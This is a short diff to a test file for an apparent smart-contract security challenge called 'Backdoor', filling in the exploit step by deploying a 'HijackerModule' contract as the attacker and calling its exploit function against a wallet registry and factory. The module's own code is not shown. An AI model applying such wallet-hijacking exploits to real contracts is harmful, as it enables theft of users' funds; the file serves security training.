@@ -37,6 +37,10 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        this.hijacker = await (await ethers.getContractFactory('HijackerModule', attacker)).deploy(
+            users, this.token.address, this.walletRegistry.address, this.masterCopy.address, this.walletFactory.address
+            );
+        await this.hijacker.exploit();
     });
 
     after(async function () {
